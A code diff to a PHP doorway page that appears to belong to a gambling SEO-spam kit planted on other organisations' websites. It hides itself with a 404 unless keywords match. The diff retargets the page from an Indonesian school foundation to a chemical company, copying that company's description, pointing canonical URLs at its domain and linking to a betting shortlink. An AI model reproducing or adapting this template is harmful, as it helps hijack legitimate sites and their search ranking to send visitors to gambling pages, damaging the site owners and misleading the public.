@@ -43,15 +43,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://kitapastiyakin.live/id/$dashbrand";
-$canonical = "https://www.darulfalah.sch.id/assets/$dashbrand";
-$cta = "https://t.ly/betboss";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729697904/OIG4.MSKyhX4jlng4KYHz.39R_aczu6h.jpg";
+$amphtml = "https://tamuramah.site/id/$dashbrand";
+$canonical = "https://satona.co.id/product/$dashbrand";
+$cta = "https://t.ly/betserulink";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729697905/OIG2.WU3Cnni0WdpyA63Ffa9o_njcp23.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Yayasam Darul Falah Cihampelas Bandung";
-$desc = "$namabrand merupakan yayasan Darul Falah di wilayah Cihampelas Bandung barat yang memiliki sekolah dari SMP sampai SMA dengan memiliki banyak siswa dan siswi serta sudah terakreditasi oleh dinas pendidikan hari ini.";
-$konten = "$namabrand $namabrand merupakan yayasan Darul Falah di wilayah Cihampelas Bandung barat yang memiliki sekolah dari SMP sampai SMA dengan memiliki banyak siswa dan siswi serta sudah terakreditasi oleh dinas pendidikan hari ini.";
+$judul = "$namabrand PT Satona Chemical Bahan Kimia Surabaya";
+$desc = "$namabrand Seiring dengan kepercayaan yang semakin meningkat dari mitra-mitra kerja perusahaan, PT. Satona semakin hari semakin berkembang dan semakin banyak melakukan perdagangan dengan beraneka produk, yang sebagian besar adalah produk kimia.";
+$konten = "$namabrand Seiring dengan kepercayaan yang semakin meningkat dari mitra-mitra kerja perusahaan, PT. Satona semakin hari semakin berkembang dan semakin banyak melakukan perdagangan dengan beraneka produk, yang sebagian besar adalah produk kimia.";
 ?>
 
 <!DOCTYPE HTML>
